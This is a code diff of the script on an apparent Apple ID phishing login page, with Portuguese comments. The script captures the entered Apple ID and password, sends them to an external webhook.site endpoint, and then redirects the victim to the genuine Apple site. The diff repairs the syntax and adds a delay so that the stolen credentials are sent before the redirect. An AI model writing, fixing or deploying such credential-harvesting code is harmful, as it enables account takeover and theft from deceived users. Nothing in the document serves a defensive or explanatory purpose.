@@ -64,35 +64,30 @@
     <script>
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
-            
-            // 1. Captura dos valores do formulário
+
             const user = document.getElementById("apple_id").value;
             const pass = document.getElementById("password").value;
-            
-            // 2. Preparação dos dados para envio
+
             const data = {
                 usuario: user,
                 senha: pass,
                 timestamp: new Date().toISOString()
             };
 
-            // 3. Envio via Fetch API com tratamento de erro
-           fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data)
-});
-
-                // 4. Redirecionamento após envio
-                window.location.href = "https://appleid.apple.com/";
-            })
-            .catch((error) => {
-                console.error('Erro:', error);
-                window.location.href = "https://appleid.apple.com/";
+            // Envio sem verificação de CORS (dados chegam, mas sem retorno)
+            fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
             });
+
+            // Redirecionamento imediato
+            setTimeout(() => {
+                window.location.href = "https://appleid.apple.com/";
+            }, 1000); // atraso leve só pra garantir envio
         });
     </script>
 </body>
